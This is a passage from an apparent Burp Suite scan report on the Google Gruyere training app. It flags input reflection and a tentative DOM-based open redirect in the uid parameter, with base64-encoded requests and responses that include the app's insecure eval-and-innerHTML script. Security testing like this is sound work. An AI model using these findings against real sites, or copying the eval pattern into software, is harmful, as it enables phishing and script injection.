    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the <b>uid</b> request parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1jaGVkZGFyeDBsOXR6Z3RzdyBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNDZlYmE2ZTZiYmQyNTM2NTM2Yzc5MGE5ZGUxZWEzYzENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDozMyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzAwMA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFNuaXBwZXRzPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKPGRpdj4KPGgyIGNsYXNzPSdoYXMtcmVmcmVzaCcgaWQ9InVzZXJfbmFtZSI+CgogIGNoZWRkYXJ4MGw5dHpndHN3CiAgCgoKPC9oMj4KPGRpdiBjbGFzcz0ncmVmcmVzaCc+PGEgY2xhc3M9J2J1dHRvbicKICBvbmNsaWNrPSdfcmVmcmVzaFNuaXBwZXRzKCI0MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYiLCAiY2hlZGRhcngwbDl0emd0c3ciKScKICBocmVmPScjJz5SZWZyZXNoPC9hPjwvZGl2Pgo8ZGl2IGNsYXNzPSdjb250ZW50Jz4KCgogIAogICAgY2hlZGRhcngwbDl0emd0c3cKICAgIGlzIG5vdCBhbiBhdXRob3IuCiAgCiAgCgoKCjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2208993557123893248</serialNumber>
    <type>5243153</type>
    <name><![CDATA[Open redirection (reflected DOM-based)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl [uid parameter]]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Reflected DOM-based vulnerabilities arise when data is copied from a request and echoed into the application's immediate response within a part of the DOM that is then processed in an unsafe way by a client-side script. An attacker can leverage the reflection to control a part of the response (for example, a JavaScript string) that can be used to trigger the DOM-based vulnerability.</p>
<p>DOM-based open redirection arises when a script  writes controllable data into the target of a redirection in an unsafe way. An attacker may be able to use the vulnerability to  construct a URL that, if visited by another application user, will cause a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.</p>
<p><b>Note:</b> If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack, by using a URL with the javascript: pseudo-protocol to execute arbitrary script code when the URL is processed by the browser.</p>

<p>Burp Suite automatically identifies this issue using static code analysis, which may lead to false positives that are not actually exploitable. The relevant code and execution paths should be reviewed to determine whether this vulnerability is indeed present, or whether mitigations are in place that would prevent exploitation.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to avoid DOM-based open redirection vulnerabilities is not to dynamically set redirection targets using data that originated from any untrusted source. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing an arbitrary URL as a redirection target. In general, this is best achieved by using a whitelist of URLs that are permitted redirection targets, and strictly validating the target against this list before performing the redirection.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601: URL Redirection to Untrusted Site ('Open Redirect')</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to reflected DOM-based open redirection.<br><br>The value of the <b>uid</b> request parameter is copied into a JavaScript string literal. The payload <b>1ovtj/mjwfe</b> was submitted in the uid parameter.<br><br>The string containing the payload is then passed to <b>the 'open()' function of an XMLHttpRequest object</b> via the following statements:<ul><li>_refreshSnippets("421683968655469260586300829583795792326", "cheddar1ovtj/mjwfe")</li><li>_refresh("/" + uniqueId + "/feed.gtl?uid=" + uid, _finishRefreshSnippets);</li><li>httpRequest.open("GET", url, true);</li></ul>]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1jaGVkZGFyMW92dGolMmZtandmZSBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYjI5YzI4M2FlMmQyYmUzMjQ3Y2UxM2UxMjdkMmQ1NDUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDo1NyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzAwMw0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFNuaXBwZXRzPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKPGRpdj4KPGgyIGNsYXNzPSdoYXMtcmVmcmVzaCcgaWQ9InVzZXJfbmFtZSI+CgogIGNoZWRkYXIxb3Z0ai9tandmZQogIAoKCjwvaDI+CjxkaXYgY2xhc3M9J3JlZnJlc2gnPjxhIGNsYXNzPSdidXR0b24nCiAgb25jbGljaz0nX3JlZnJlc2hTbmlwcGV0cygiNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2IiwgImNoZWRkYXIxb3Z0ai9tandmZSIpJwogIGhyZWY9JyMnPlJlZnJlc2g8L2E+PC9kaXY+CjxkaXYgY2xhc3M9J2NvbnRlbnQnPgoKCiAgCiAgICBjaGVkZGFyMW92dGovbWp3ZmUKICAgIGlzIG5vdCBhbiBhdXRob3IuCiAgCiAgCgoKCjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbGliLmpzIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL2phdmFzY3JpcHQNCkNhY2hlLWNvbnRyb2w6IHB1YmxpYywgbWF4LWFnZT03MjAwDQpYLVhTUy1Qcm90ZWN0aW9uOiAwDQpYLUNsb3VkLVRyYWNlLUNvbnRleHQ6IGRjNzFkZjliNjc4NzkzZTA5MjFlNjFhYzNlZDkzOTViDQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNCkRhdGU6IFRodSwgMTggSmFuIDIwMTggMDk6Mjc6NDggR01UDQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDE5NjINCkNvbm5lY3Rpb246IGNsb3NlDQoNCi8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCi8qKgogKiBTd2FwcyB0aGUgZGlzcGxheSBzZXR0aW5ncyBvZiB0d28gZWxlbWVudHMuIEJlZm9yZSBjYWxsaW5nLCBleGFjdGx5IG9uZQogKiBvZiB0aGUgdHdvIGVsZW1lbnRzIHNob3VsZCBoYXZlIHN0eWxlPSJkaXNwbGF5Om5vbmUiIGFuZCBpdCBzaG93cyB0aGUgb25lCiAqIHRoYXQgaXMgaGlkZGVuIGFuZCBoaWRlcyB0aGUgb25lIHRoYXQgaXMgc2hvd24uCiAqLwpmdW5jdGlvbiBfc2hvd0hpZGUoaWQxLCBpZDIpIHsKICB2YXIgeDEgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZDEpOwogIHZhciB4MiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkMik7CiAgdmFyIHNob3duID0geDEuc3R5bGUuZGlzcGxheSAhPSAnJzsKICB4MS5zdHlsZS5kaXNwbGF5ID0gc2hvd24gPyAnJyA6ICdub25lJzsKICB4Mi5zdHlsZS5kaXNwbGF5ID0gc2hvd24gPyAnbm9uZScgOiAnJzsKfTsKCi8qKgogKiBSZWZyZXNoZXMgdGhlIGN1cnJlbnQgcGFnZSBieSBsb2FkaW5nIHRoZSB1cmwgYW5kIHRoZW4gcGFzc2luZyB0aGUKICoganNvbiByZXNwb25zZSBvYmplY3QgdG8gdGhlIGNhbGxiYWNrLgogKi8KZnVuY3Rpb24gX3JlZnJlc2godXJsLCBjYWxsYmFjaykgewogIHZhciBodHRwUmVxdWVzdCA9IHdpbmRvdy5YTUxIdHRwUmVxdWVzdCA/IG5ldyBYTUxIdHRwUmVxdWVzdCgpCiAgICAgIDogbmV3IEFjdGl2ZVhPYmplY3QoIk1pY3Jvc29mdC5YTUxIVFRQIik7CiAgaHR0cFJlcXVlc3Qub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICBpZiAoaHR0cFJlcXVlc3QucmVhZHlTdGF0ZSA9PSA0KSB7CiAgICAgIF9mZWVkID0gY2FsbGJhY2s7CiAgICAgIGV2YWwoJygnICsgaHR0cFJlcXVlc3QucmVzcG9uc2VUZXh0ICsgJyknKTsKICAgICAgaHR0cFJlcXVlc3QgPSBudWxsOwogICAgfQogIH0KICBodHRwUmVxdWVzdC5vcGVuKCJHRVQiLCB1cmwsIHRydWUpOwogIGh0dHBSZXF1ZXN0LnNlbmQobnVsbCk7Cn07CgovKioKICogUHJvY2Vzc2VzIHJlZnJlc2ggcmVzcG9uc2Ugeydwcml2YXRlX3NuaXBwZXQnOnNuaXBwZXQsIHVzZXI6c25pcHBldCwgLi4ufQogKi8KZnVuY3Rpb24gX2ZpbmlzaFJlZnJlc2hIb21lKHJlc3BvbnNlKSB7CiAgZm9yICh2YXIgdWlkIGluIHJlc3BvbnNlKSB7CiAgICB2YXIgZWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKHVpZCk7CiAgICBpZiAoZWxlbWVudCkgewogICAgICBlbGVtZW50LmlubmVySFRNTCA9IHJlc3BvbnNlW3VpZF07CiAgICB9CiAgfQp9OwoKZnVuY3Rpb24gX3JlZnJlc2hIb21lKHVuaXF1ZUlkKSB7CiAgX3JlZnJlc2goIi8iICsgdW5pcXVlSWQgKyAiL2ZlZWQuZ3RsIiwgX2ZpbmlzaFJlZnJlc2hIb21lKTsKfTsKCi8qKgogKiBQcm9jZXNzZXMgcmVmcmVzaCByZXNwb25zZSBbbmFtZSwgc25pcHBldCwgLi4uXQogKi8KZnVuY3Rpb24gX2ZpbmlzaFJlZnJlc2hTbmlwcGV0cyhyZXNwb25zZSkgewogIHZhciBuID0gcmVzcG9uc2UubGVuZ3RoOwogIHZhciBlbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJfbmFtZScpOwogIGlmIChuICYmIGVsZW1lbnQpIHsKICAgIGVsZW1lbnQuaW5uZXJIVE1MID0gcmVzcG9uc2VbMF07CiAgfQoKICAvLyBUaGUgc25pcHBldCBkaXZzIGFyZSBudW1iZXJlZCAwLCAxLCAuLi4KICBmb3IgKHZhciBpID0gMTsgaSA8IG47ICsraSkgewogICAgdmFyIGVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpIC0gMSk7CiAgICBpZiAoZWxlbWVudCkgewogICAgICBlbGVtZW50LmlubmVySFRNTCA9IHJlc3BvbnNlW2ldOwogICAgfQogIH0KfTsKCmZ1bmN0aW9uIF9yZWZyZXNoU25pcHBldHModW5pcXVlSWQsIHVpZCkgewogIF9yZWZyZXNoKCIvIiArIHVuaXF1ZUlkICsgIi9mZWVkLmd0bD91aWQ9IiArIHVpZCwgX2ZpbmlzaFJlZnJlc2hTbmlwcGV0cyk7Cn07Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>93841116745643008</serialNumber>
